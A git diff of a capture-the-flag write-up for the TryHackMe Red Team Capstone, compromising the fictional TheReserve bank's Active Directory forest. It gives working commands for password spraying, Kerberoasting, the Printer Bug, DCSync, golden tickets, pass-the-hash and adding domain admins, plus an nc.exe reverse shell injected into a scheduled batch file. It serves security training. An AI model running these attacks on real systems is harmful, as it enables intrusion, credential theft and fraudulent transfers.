@@ -1,5 +1,17 @@
 # Red Team Capstone Challenge
 ![ ](back2.jpg)
+## Intro
+Having followed the Red Teamer pathway, the natural conclusion is to face this challenge. The challenge is very hard (of course it depends of your skills, for me it was) but it's a great fun and, above all, a great opportunity to learn. I tried (and passed) other exam\course like eLearning and Virtual hacking labs, but here the quality is really higher (again this is only my opinion, THM does not pay me :)), but as explained in the exam engagement, all the techniques necessary to reach the final goal are covered during the Red Teamer course. I fixed a personal goal too: be as stealth as possible, that involved to:
+1. Not using Mimikatz since it is flagged by Defender even if it is executed from an exluded folder
+2. Live off the land (of couse it was really too much presumptuous of me :)), at least as much as possible
+3. Do not change user's password
+
+Two final notes about this writeup:
+- There are no images
+- As required to submit the writeup the password, the hashes and the flags are not disclosed.
+
+Enjoy and thank you for reading.
+
 ## Recon phase
 ### 10.200.89.13 WEB Server
 I found possible list of usernames visiting the URL
@@ -60,48 +72,49 @@ Submitting a login request
 
 	http://10.200.89.12/login.php?user=antony.ross%40corp.thereserve.loc&password=Spring2024
 
-we can notice that the form parameters are passed using GET, that's a very bad configuration, I guess is a custom application, badly programmed and I expect that non lock-out mechanism are in place.
-Using the browser exstension Wappalyzer we got the following information:
+we can notice that the form parameters are passed using GET, that's a very bad configuration, I guess is a custom application, badly programmed. I submitted five login attempts and I was not locked-out, so I expect that a policy is not in place. Using the browser exstension Wappalyzer we got the following information about the server:
 	
 	Web servers: Apache HTTP Server 2.4.29
 	Programming languages: PHP
 	Operating systems Ubuntu
 ## Attack
 
-I created a [password list](pwd_list), based on the one provided, adding the complexity criteria indicated, you can find the bash script [here](https://github.com/zinzloun/Infosec-scripts-tools/blob/master/bash/crunch_from_list.sh) to generate the list. The user list is the one we obtained in the recon phase, applying the password policy for TheReserve is the following:
+I created a [password list](pwd_list), based on the one provided during the engagement, adding the complexity criteria as indicated, you can find the bash script [here](https://github.com/zinzloun/Infosec-scripts-tools/blob/master/bash/crunch_from_list.sh) to generate the list. The user list is the one we obtained in the recon phase, applying the password policy for TheReserve is the following:
 
 * At least 8 characters long
 * At least 1 number
 * At least 1 special character in !@#$%^
   
 I used a password spray approach, since I have already coded a [script](https://github.com/zinzloun/Infosec-scripts-tools/blob/master/bash/spray_with_hydra.sh) to perform it using hydra.
-Configure the script as indicated in the comments. Set the <b>avanti</b> variable to 1, so the procedure won't stop to the first valid credentials found. 
+Configure the script as indicated in the comments. Set the <b>avanti</b> variable to 1, so the procedure won't eventually stop to the first valid credentials found. 
 Please note that it will take more or less 3 hours to complete the attack.
 
 In the meanwhile we can check for well-known vulnerability regarding the discovered assets on the mail server. 
 From the scan we can see that SMB signing is not strictly required.
-I found two critics flow regarding MySQL, but it seems there are no exploits available in the wild: https://www.cybersecurity-help.cz/vdb/SB2023011781
+I found two critics vulnerabilities regarding MySQL, but it seems there are no exploits available in the wild: https://www.cybersecurity-help.cz/vdb/SB2023011781
 
-Some RoundCube versions are affected by XSS vulnerability that could be used to steal information: https://www.welivesecurity.com/en/eset-research/winter-vivern-exploits-zero-day-vulnerability-roundcube-webmail-servers,
-that could be investigated. In the meanwhile the brute-force process finished and I found 2 valids credentials:
+As previously mentionted, some RoundCube versions are affected by XSS vulnerability that could be used to steal information: https://www.welivesecurity.com/en/eset-research/winter-vivern-exploits-zero-day-vulnerability-roundcube-webmail-servers,
+that deserve to be investigated. In the meanwhile the brute-force process finished and I found 2 valids credentials:
 
-	mohammad.ahmed@corp.thereserve.loc:Password1!
-	laura.wood@corp.thereserve.loc:Password1@
+	mohammad.ahmed@corp.thereserve.loc:xxxxxx
+	laura.wood@corp.thereserve.loc:zzzzzzzzzz
 
 
 ### Compromise workstations
 
 With those information we can login into the mail server as well, that suggests that we got domain credentials. Nothing interesting is found accessing the web mail in the users mailboxe.
-Login to the vpn portal using ahmed user and we can downlod a ovpn file. Using the file to open a vpn session:
+Login to the vpn portal using ahmed user and we can download a ovpn file. Using the file to open a vpn session:
 
 	openvpn --config mohammad.ahmed\@corp.thereserve.loc.ovpn 
 
-Then checking the table route: route -n
+Then checking the table route: 
+	
+ 	route -n
 
 	10.200.89.21    12.100.1.1      255.255.255.255 UGH   1000   0        0 tun0
 	10.200.89.22    12.100.1.1      255.255.255.255 UGH   1000   0        0 tun0
 
-We found that we can reach now two more hosts, so we procede to scan them
+We found that we can reach now two more hosts, so we procede to scan them:
 
 	nmap -sVC 10.200.89.21 -Pn
 	
@@ -158,7 +171,7 @@ We found that we can reach now two more hosts, so we procede to scan them
 		|_  start_date: 1600-12-31 23:58:45
 
 I realized (submitting flags) that SSH is used by THM to manage the LAB, so don't try to attack this service.
-So we need to proceed using RDP to connect to the host wrk1 using ahmed credentials, then I started to check for the privileges provided to the current user, using the following commands:
+We can proceed with RDP to connect to the host wrk1 using ahmed credentials, then I started to check for the privileges configured for the current user, using the following commands:
 
 	net user
 	net user mohammad.ahmed /domain
@@ -178,8 +191,8 @@ Nothing very interesting emerged. Then I identified the domain cotroller
 In powershell we can check that defender is enabled:
 
 	Get-MpComputerStatus
+ 
  	AMEngineVersion                  : 1.1.20300.3
-
 	AMProductVersion                 : 4.18.2304.8
 	AMRunningMode                    : Normal
 	AMServiceEnabled                 : True
@@ -223,7 +236,7 @@ List all the configured services (powershell) on wrk1
  	Get-WmiObject win32_service | select name, status, pathname, startmode, description, processid, startname, started, state | ogv
 ### Escalate privileges on the workstations
 
-Interesting enough there is a Backup service that presents an unquoted path<b>C:\Backup Service\Full Backup\backup.exe</b>, the service is manually started, let's check which permissions have the current user on the executable:
+Interesting enough there is a Backup service that presents an unquoted path<b>C:\Backup Service\Full Backup\backup.exe</b>, the service is manually started, let's check which permissions have the current user (laura) on the executable:
 
 	icacls "C:\Backup Service\Full Backup\backup.exe"
 		C:\Backup Service\Full Backup\backup.exe Everyone:(I)(F)
@@ -249,7 +262,7 @@ Then I proceed to create a local user with admin privileges
 
 #### Flags submissions
 I can submit the first four flags.
-I used the local administrator user to access wrk1 using RDP, then I created an hidden folder in C:\Users\support\def-exc to be excluded by windows defender (run the command as administrator):
+Then I used the local administrator user to access wrk1 using RDP, then I created an hidden folder in C:\Users\support\def-exc to be excluded by windows defender (run the command as administrator):
 
 	Set-MpPreference -ExclusionPath "C:\users\support\def-exc"	
 
@@ -288,7 +301,7 @@ Then add the routing information according to the interface you want to reach, i
 
 	ip route add 10.200.89.102/32 dev ligolo
 
-Finally in the agent command interface issue 
+Finally in the agent command interface issue:
 
 	start
 
@@ -302,7 +315,7 @@ Youm must also open this port on Windows firewall
 That implies I can reach my python web server from other hosts visitng the following URL http://10.200.89.21:1180
  
  ### Kerberosting
- Now that I can reach the DC directly from the attacker machine, we can use Impacket to search for kerberostable service accounts. This time I used laura.wood credentials to query Active Directory:
+ Now that I can reach the DC directly from the attacker machine, we can use Impacket to search for kerberostable service accounts. Again I used laura.wood credentials to query Active Directory:
 
  	impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.200.89.102  'corp.thereserve.loc/laura.wood:Password1@'
   	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -316,15 +329,14 @@ That implies I can reach my python web server from other hosts visitng the follo
 	mssql/svcOctober      svcOctober   CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc  2023-02-15 10:07:45.563346  2023-03-31 00:26:54.115866             
 
   
-I got 5 candidates. The next step it's to try to extract the password from Kerberos tickets, since they are encrypted with the password of the service account associated with the SPN specified in the ticket request.
-The tickets are saved in kerberoastables.txt file, I used haschcat with the previously generated passwords list used to brute-force the VPN server.
+I got five candidates. The next step it's to try to extract the password from Kerberos tickets, since they are encrypted with the password of the service account associated with the SPN specified in the ticket request. The tickets are saved in kerberoastables.txt file, I used haschcat with the previously generated passwords list, the same used to brute-force the VPN server.
 
   	hashcat -a 0 -m 13100 kerberoastables.txt pwd_list
 
 After a while I found a valid password (reused) for svcScanning user:
 
 	$krb5tgs$23$*svcScanning$CORP.THERESERVE.LOC$corp.thereserve.loc/svcScanning*$9b49...
- 	...7749a88126a66ac2:Password1!
+ 	...7749a88126a66ac2:xxxxxxxxx
   
 ### Compromise servers
 From the wrk1 workstation I used the following powershell snippet to perform a host discovery using common windows ports: 
@@ -379,8 +391,7 @@ I can submit flags 5 and 6
 
 ### Audit Active directory from Server1
 
-I managed to transfer <b>PingCastle</b> to the server from the attacker machine. I decided to use [Pingcastle](https://www.pingcastle.com/download) since it is not flagged as malicious and perform very well.
-It produces a detailed report with explanation about found vulnerabilities, just run the exe. The report highlights two important things:
+I managed to transfer <b>PingCastle</b> to the server from my attacker machine. I decided to use [Pingcastle](https://www.pingcastle.com/download) since it is not flagged as malicious and perform very well. It produces a detailed report with explanation about found vulnerabilities, just run the exe. The report highlights two important things:
 1. trusted delegation betwenn domain controller and the servers
 
 		Object trusted to authentication for delegation			
@@ -394,11 +405,10 @@ It produces a detailed report with explanation about found vulnerabilities, just
 
 As the repost states:
 
-<i>When there's an account with unconstrained delegation configured (which is fairly common) and the Print Spooler service running on a computer, you can get that computers credentials sent to the system with unconstrained delegation as a user. With a domain controller, the TGT of the DC can be extracted allowing an attacker to reuse it with a DCSync attack and obtain all user hashes and impersonate them.
-	The Print Spooler service should be deactivated on domain controllers</i>
+<i>When there's an account with unconstrained delegation configured (which is fairly common) and the Print Spooler service running on a computer, you can get that computers credentials sent to the system with unconstrained delegation as a user. With a domain controller, the TGT of the DC can be extracted allowing an attacker to reuse it with a DCSync attack and obtain all user hashes and impersonate them. The Print Spooler service should be deactivated on domain controllers</i>
  
 ### Printer bug
-In this scenario I could try exploit the so-called feature, better to say bug, known as [Printer Bug](https://www.thehackersprint.com/kerberos-delegation-and-abuse-cases/unconstrained-delegation/printer-bug).
+In this scenario I could try to exploit the so-called feature, better to say bug, known as [Printer Bug](https://www.thehackersprint.com/kerberos-delegation-and-abuse-cases/unconstrained-delegation/printer-bug).
 To succeed we need to force corpdc to authenticate against server1 (that we control), that is possible since the trusted authentication is configured between the two hosts.
 So first of all on server1 I started Rubeus monitor to intercept TGT tickets:
 
@@ -411,7 +421,7 @@ So first of all on server1 I started Rubeus monitor to intercept TGT tickets:
 		[*] Monitoring every 10 seconds for new TGTs
 
 
-Then I procedeed to download the [SpoolSample.exe](https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe) into server1 from the attacker machine (downlad the file into excluded folder, otherwise it will be caught by Defender). This file allows to trigger the authentication action from corpdc to server1. 
+Then I procedeed to download the [SpoolSample.exe](https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe) into server1 from my attacker machine (downlad the file into excluded folder, otherwise it will be caught by Defender). This file allows to trigger the authentication action from corpdc to server1. 
 
 Execute the following command:
 
@@ -437,7 +447,7 @@ Please note that you must use the FQDN for the server, otherwise SpoolSample fai
 	
 	[*] Ticket cache size: 1
 
-With Rubeus we can also import the TGT ticket into current session. To do that first we need to issue klist to find the LUID
+With Rubeus we can also import the TGT ticket into current session. To do that first we need to issue klist to find the LUID (logon id):
 
 	klist
  	Current LogonId is 0:0x2027d4
@@ -445,7 +455,7 @@ With Rubeus we can also import the TGT ticket into current session. To do that f
 
    	Rubeus.exe ptt /luid:0x2027d4 /ticket:doIF2jCCBdagAwIBBaEDAgEWooIEyzCCB...FUkVTRVJWRS5MT0OpKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0NPUlAuVEhFUkVTRVJWRS5MT0M=
 
-Verify that the ticket has been injected
+Verify that the ticket has been injected:
 
 	klist
 	
@@ -465,8 +475,8 @@ Verify that the ticket has been injected
 	        Kdc Called:
 ### DCSync attack
 
-Nowthat we have inject the CORPDc user ticket in our current session, we can proceed to perform a [DcSync attack](https://www.thehacker.recipes/a-d/movement/credentials/dumping/dcsync) to try to dump NTLM hash for domain users. I will perform the attack without using Mimikatz, since it's heavely monitored. I found this useful tool [DCSyncer](https://github.com/notsoshant/DCSyncer/releases/tag/v1.0).
-The tool will dump hashes for all users, single user hash dump is not supported, so I saved the output into a file
+Now that we have inject the CORPDc user ticket in our current session, we can proceed to perform a [DcSync attack](https://www.thehacker.recipes/a-d/movement/credentials/dumping/dcsync) to try to dump NTLM hash for domain users. Without using Mimikatz, I found this useful tool [DCSyncer](https://github.com/notsoshant/DCSyncer/releases/tag/v1.0).
+The tool will dump hashes for all users, single user hash dump is not supported, so I saved the output into a file:
 
 	DCSyncer-x64.exe > dump-hash.txt
  
@@ -479,7 +489,7 @@ We found two juicy hash for users: administrator
 	Object Relative ID   : 500
 	
 	Credentials:
-	  Hash NTLM: d3d4edcc015856e386074795aea86b3e
+	  Hash NTLM: zzzzzzzzzzzzzzzzzzzzzzzzzzz
 and krbtgt
 
 	Object RDN           : krbtgt
@@ -489,7 +499,7 @@ and krbtgt
 	Object Relative ID   : 502
 	
 	Credentials:
-	  Hash NTLM: 0c757a3445acb94a654554f3ac529ede
+	  Hash NTLM: aaaaaaaaaaaaaaaaaaaaaaaaaaa
 
 The last one could be used to perform a golden ticket attack.
 
@@ -497,7 +507,7 @@ The last one could be used to perform a golden ticket attack.
 
 Now we can ask a TGT ticket for the Administrator user and inject it directly into the current session:
 
-	Rubeus.exe asktgt /user:administrator /rc4:d3d4edcc015856e386074795aea86b3e /ptt
+	Rubeus.exe asktgt /user:administrator /rc4:zzzzzzzzzzzzzzzzzzzzzzzzzzz /ptt
 	Ticket successfully imported!
 
 	  ServiceName              :  krbtgt/corp.thereserve.loc
@@ -524,7 +534,7 @@ Now we can ask a TGT ticket for the Administrator user and inject it directly in
 	        Cache Flags: 0x1 -> PRIMARY
 	        Kdc Called:
 		
-We can confirm the exploit having access to C$ on the domain controller
+We can confirm the exploit worked having access to C$ on the domain controller:
 	
  	dir \\corpdc.CORP.THERESERVE.LOC\C$
 	 Volume in drive \\corpdc.CORP.THERESERVE.LOC\C$ has no label.
@@ -542,7 +552,7 @@ Finally we can get a shell on the DC as administrator
  	Enter-PSSession -computer corpdc.CORP.THERESERVE.LOC
 	[corpdc.CORP.THERESERVE.LOC]: PS C:\Users\Administrator\Documents>whoami
 	corp\administrator
-Now I'm going to add a user to the domain admins
+Now I'm going to add a user to the domain admins:
 
 	net user it.support Password2@ /ADD /DOMAIN
 	net group "Domain Admins" it.support /ADD /DOMAIN
@@ -555,10 +565,11 @@ Check it out:
 	-------------------------------------------------------------------------------
 	Administrator            it.support
 
-Using the newly created  user we can RDP to corpdc.
+Using the newly created  user we can RDP to corpdc server:
 
 #### Flags submission
-We can submit flags 7 and 8
+We can submit flags 7 and 8.
+
 I know from PingCastle report that a AD forest is in place:
 
 	Reachable domain: bank.thereserve.loc
@@ -603,14 +614,12 @@ we can get these information:
 		thereserve DC=thereserve,DC=loc         S-1-5-21-1255581842-1300659601-3764024703
 
   
-As usual I created an exclusion in Defender 
-
- 	C:\Users\it.support\def-exc
+As usual I created an exclusion in Defender in <b>C:\Users\it.support\def-exc</b>.
  
-I manged to transfer Rubeus (please note that to forge a golden ticket you must have version >= 2) from the attacker machine.
+I manged to transfer Rubeus (please note that to forge a golden ticket you must have version >= 2) from my attacker machine as previously done for the other tools used.
 To successfully forge the golden ticket on the trusted root domain, we have to append -519 to the discovered SID, since the Well-known SID/RID format is S-1-5-21-{root domain}-519. This SID identifies the Enterprise Admins group. This group exists only in the root domain of an Active Directory forest. By default, the only member of the group is the Administrator account for the forest root domain, so we must use this user in order to generate the ticket. More details can be found [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups). Following is the whole command:
 
- 	rubeus.exe golden /rc4:0c757a3445acb94a654554f3ac529ede /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 ^
+ 	rubeus.exe golden /rc4:zzzzzzzzzzzzzzz /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 ^
   	/sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt
 		
   		......
@@ -671,7 +680,7 @@ Check if we can access the rootdc:
  	PS C:\Users\it.support\def-exc> Enter-PSSession -computer rootdc.THERESERVE.LOC
 	[rootdc.THERESERVE.LOC]: PS C:\Users\Administrator.CORP\Documents>
 
- I added a new enterprise admins to the root domain
+ I added a new enterprise admins to the root domain controller:
  
  	 net user it.supportEA Password2@ /ADD /DOMAIN
  	 net group "Enterprise Admins" it.supportEA /ADD /DOMAIN
@@ -716,13 +725,13 @@ Ligolo is really a great tool!
 Now in ligolo console switch to the new session and start the tunnel using the following command:
 
 	start --tun ligolo_rdc	
-Add route to the bank dc server:
+Add route to the bank dc server on our attacker machine:
 
  	ip route add 10.200.89.101/32 dev ligolo_rdc
 
 ### Access bank domain controller
 Now we can RDP directly from our attacker machine to the bank dc, using the user <b>it.supportea (domain thereserve.loc)</b>. 
-I started to discovery domain's host using powershell:
+I started to search for domain's host using powershell:
 
 	get-adcomputer -filter *
 
@@ -746,7 +755,7 @@ I started to discovery domain's host using powershell:
 		Name              : JMP
 		ObjectClass       : computer
 		...
-Apart the bankdc I found other 3 computer, one named JMP probably a jump box. We can find the IP addresses as follows:
+Apart the bankdc, I found other 3 computer, one named JMP probably a jump box. We can find the IP addresses as follows:
 
 	Get-DnsServerResourceRecord -ZoneName "bank.thereserve.loc" -RRType "A" | select-object -ExpandProperty recorddata -Property Hostname
 		Hostname       IPv4Address   PSComputerName
@@ -799,7 +808,7 @@ to access the swift application.
 On the attacker machine I added the following routes:
 
 	ip route add 10.200.89.51/32 dev ligolo_rdc & ip route add 10.200.89.52/32 dev ligolo_rdc & ip route add 10.200.89.61/32 dev ligolo_rdc
-Then I tried to login as the it.supportea user to the jmp host, using remmina; even if we are Enterprise Admins it seems that we cannot access the jump box, so I added a new user to the Tier 0 Admins group form the bankdc server:
+Then I tried to login as it.supportea user to the jmp host, using remmina; even if we are Enterprise Admins it seems that we cannot access the jump box, so I added a new user to the Tier 0 Admins group in the bankdc server:
 
 	net user it.support_bank Password2@ /ADD /DOMAIN
  	net group "Tier 0 Admins" it.support_bank /ADD /DOMAIN
@@ -808,7 +817,7 @@ You can now submit flags 13 and 14
  
 ### Access to jmp server
 With the newly created users we can now access the JMP host in RDP. Being part of the Tier 0 admins involves being administrator of the host too. Once logged on the jump box I started the
-information gathering process. When searching for juicy file I found this one:
+information gathering process. Searching for juicy file I found this one:
 
 	ps: C\Users>Get-ChildItem -Recurse | Select-String "password" -List | Select Path
 
@@ -839,18 +848,15 @@ Inspecting the g.watson user's file we found a password:
   	Welcome capturer to the SWIFT team.
 	You can access the SWIFT system here: http://swift.bank.thereserve.loc
 	#Storing this here:
-	Corrected1996
+	zzzzzzzzzzzzzzzzzzz
  
  #### Flag submissions
  We can now submit flags 9, 10, 11 and 12.
- Now if we visited the swift URL from the JMP host (actually you can reache the swift app from work1 and work2) we can use the following credentials to login: 
- 
- 	g.watson@bank.thereserve.loc\Corrected1996
+ Now if we visited the swift URL from the JMP host (actually you can reache the swift app from work1 and work2 too) we can login as <b>g.watson@bank.thereserve.loc</b> user
 
-Since <b>g.watson is part of the capturer group</b>, we need to find valid credentials for an approver. We know that <b>a.holt user is member of the approver</b>, since we foud the welcome message on the
-JMP host, inspecting his appdata folder I noticed that the saved password default file for Chrome is present: <b>C:\Users\a.holt\AppData\Local\Google\Chrome\User Data\Default\Login Data</b>.
-The file is encrypted using the CryptProtectData DPAPI function. In theory could be possible to extract the hash in some way without being the logged in as the user, then to try to crack it offline, but it seemed to me overcomplicated. A faster approach in this situation, try to follow the KIS principle, could be performing a DCSync attack to get the NTLM hash of a.holt user. An even faster solution would be changing directly a.holt password but in a real engagement this action will be noticed for sure.
-On ligolo proxy I set another listener on the session 2 (the one coming froom rootdc), to forward the request on port 8000 of rootdc to the same port on our attacker machine, that expose the python webserver:
+Since <b>g.watson is part of the capturer group</b>, we need to find valid credentials for an approver. We know that <b>a.holt user is member of the approver</b>, since we foud the welcome message on the JMP host, inspecting his appdata folder, I noticed that the saved password default file for Chrome is present: <b>C:\Users\a.holt\AppData\Local\Google\Chrome\User Data\Default\Login Data</b>.
+The file is encrypted using the CryptProtectData DPAPI function. In theory could be possible to extract the hash in some way without being logged in as the corresponding user, to try to crack it offline, but it seemed to me overcomplicated. A faster approach in this situation, try to follow the KIS principle, could be performing a DCSync attack to get the NTLM hash of a.holt user. An even faster solution would be changing directly a.holt password but in a real engagement this action will be noticed for sure.
+On ligolo proxy I set another listener on the session 2 (the one coming froom rootdc), to forward the request on port 8000 of rootdc to the same port on our attacker machine, that exposes the python webserver:
 
 	listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
 
@@ -875,7 +881,7 @@ Since we want to access the service from a remote host (bankdc) to download the 
 	PolicyStoreSource     : PersistentStore
 	PolicyStoreSourceType : Local
 
-Now from the bankdc host we can proceed to download the DCSyncer exe from the attacker machine visiting the following URL:
+Now from the bankdc host we can proceed to download the DCSyncer.exe from the attacker machine, visiting the following URL:
 
  	http://10.200.89.100:8000/DCSyncer.exe
  
@@ -892,9 +898,9 @@ Searching the file for a.holt we can read the hashed password for the user:
 	Object Relative ID   : 1155
 	
 	Credentials:
-	  Hash NTLM: d1b47b43b82460e3383d974366233ddc
+	  Hash NTLM: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
 
-At this point I though to use xfreerd that support PTH to access the JMP host. Before to proceed we need to set the following on the JMP host (perform the commands as administrator):
+At this point I though to use xfreerd, since support PTH, to access the JMP host. Before to proceed we need to set the following steps on the JMP host (perform the commands as administrator):
 
 	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 	The operation completed successfully.
@@ -905,14 +911,12 @@ The user must be member of the local admin group (otherwise you won't be able to
 
 More information can be found [here](https://medium.com/@jakemcgreevy/pass-the-hash-pth-with-rdp-80595fb38bef)
 
-From the attacker machine I connected using xfreerdp, since remmina does not support PTH:
+From the attacker machine I connected using xfreerdp:
 
-	xfreerdp /u:"bank.thereserve.loc\a.holt" /pth:d1b47b43b82460e3383d974366233ddc /v:10.200.89.61
+	xfreerdp /u:"bank.thereserve.loc\a.holt" /pth:zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz /v:10.200.89.61
 
 ### Compromise swift application
-Once logged in as <b>a.holt user</b> I thought that I could find the credentials to access the swift application saved in Chrome, but opening the passwords tab on the browser settings I found nothing.
-Probably something was messed up with DPAPI master key that prevent me to see saved password, maybe login using PTH involves some issue, actually I need to investigate the problem further.
-At the moment I decided to give up this way and I started again to perform information gathering on bank subdomain controller (bankdc). I logged in using the administrator accout <b>it.support_bank</b>; again I started to search for juicy files containing the word 'password' in it.
+Once logged in as <b>a.holt user</b> I thought that I could find the credentials to access the swift application saved in Chrome, but opening the passwords tab on the browser settings I found nothing. Probably something was messed up with DPAPI master key that prevent me to see saved password, maybe login using PTH involves some issue, actually I need to investigate the problem further. At the moment I decided to give up this way and I started again to perform information gathering on bank subdomain controller (bankdc). I logged in using the administrator accout <b>it.support_bank</b>; again I started to search for juicy files containing the word 'password' in it.
 I started from C:\users folder, but I found nothing, then proceeding to search in other folders, finally I found the following:
 
 	PS C:\Windows\SYSVOL> Get-ChildItem -Recurse  | Select-String "password" -List | Select -ExpandProperty Path
@@ -928,7 +932,7 @@ The approver_api_script sounds really promising:
 		#The script first generates a JWT for the user and then makes the approval request
 		
 		username = "r.davies" #Change this to your approver username
-		password = "thereserveapprover1!" #Change this to your approver password
+		password = "zzzzzzzzzzzzzzzzzzzzz" #Change this to your approver password
 		
 		import requests
 		session = requests.session()
@@ -936,22 +940,22 @@ The approver_api_script sounds really promising:
 		token = session.post("http://swift.bank.thereserve.loc/login", {username: username, password: password})
 		#TBC rest of script should be added
 
-Trying these credentials on the swift application I was able to access the application as an approver user, so now we are in the position to execute the whole transaction flow since we are in control of both user's profile: capturer and approver. To accomplish the task just follow the instruction on the e-citizen portal. Once authenticated, you can submit the following flags in order:
+Using these credentials on the swift application, I was able to access as an approver user, so now we are in the position to execute the whole transaction flow, since we are in control of both user's profile: capturer and approver. To accomplish the task just follow the instruction on the e-citizen portal. Once authenticated, you can submit the following flags in order:
 - 17, 18, 19
-- 20: Since the instructions were not so clear (at least for me) the PIN to approve the transation is sent to your email address, the one provided during the registration to the e-citizen portal. Access you email at mail.thereserve.loc/index.php and look for email containing your PIN
+- 20: Since the instructions were not so clear to me, the PIN to approve the transation is sent to your email address, the one provided during the registration to the e-citizen portal. Access you email at mail.thereserve.loc/index.php and look for email containing your PIN
 
 ## Conclusion
-The challange was really hard and it takes 2 weeks (2 hours a day) to me to finish. I'd say that it is quite realistic, but in my opinion in an engagement for a real bank the security maturity level it would be higher compared to TheReserve. Anyway the network architecture provided here is realistic for sure. Performing the tasks I tried to keep as stealthy as possible, so I avoided to use Mimikatz for istance, anyway I left some indicators (IOC) behind me:
+The challange was really hard and it takes two weeks (2 hours a day) to me to finish. I'd say that it is quite realistic, but in my opinion in a real engagement, in a bank enviroment, the security maturity level it would be higher compared to TheReserve. Anyway the network architecture provided here is realistic for sure. Performing the tasks, as said in the introduction, I tried to keep as stealthy as possible, anyway I left some indicators (IOC) behind me:
 - Administrator's account creation
 - Defender folder exclusions (I avoided to complitely disable Defender)
 - Tools: Ligolo-NG agent, Rubeus, DCSyncer, SampleSpool
 - Account take-over
 
-I'd say that the lab is one of the best I've ever done, and after having completed the Redteamer learning path you cannot miss.
+I'd say that the lab is one of the best I've ever done, and after having completed the Redteamer learning path you cannot miss it. So thank you to THM for the great lab very much.
 
 ## Remediation
 I'd suggest to TheReserve the following remediation steps:
-- Users security awarness training (since I found weak and reused passwords, password written in code, default credential)
+- Users security awarness training (since I found weak and reused passwords, password written in code, default credentials)
 - Continuos monitoring, install a SIEM\XDR solution
 - Hardening AD, including Kerberos (see notes for some resources), use gMSA for service account
 
@@ -980,7 +984,7 @@ So we can modify the file, eventually to get a recverse shell on our attacker ma
  On wrk2 modify sync.bat as follows:
 
  	copy C:\Windows\Temp \\s3.corp.thereserve.loc\backups\ & C:\users\laura.wood\Downloads\nc.exe 12.100.1.8 1234 -e powershell
-The IP address refers to my VPN IP on tun0 interface. Then you can wait 5 minutes when the task will be executed or lunch it manually using
+The IP address refers to my VPN IP on tun0 interface. Then you can wait 5 minutes when the task will be executed or lunch it manually using the command:
 
 	SCHTASKS /Run /? /TN FULLSYNC
 
@@ -1007,7 +1011,7 @@ You can test it submitting the following value:
 	Warning: Permanently added '10.200.89.101' (ECDSA) to the list of known hosts.
 	THMSetup@10.200.89.101: Permission denied (publickey,keyboard-interactive).
 
-If you get this type of error, as indicated in the Discord channell, that problem can happen is if someone tampered with the admin SSH authorized_keys files on the host and deleted the existing keys. A network reset should resolve the issue
+If you get this type of error, as indicated in the Discord channell, the problem can happen is if someone tampered with the admin SSH authorized_keys files on the host and deleted the existing keys. A network reset should resolve the issue, so keep not of the steps you performed and the found credentials:
 
 ### References
 ### Hardening AD
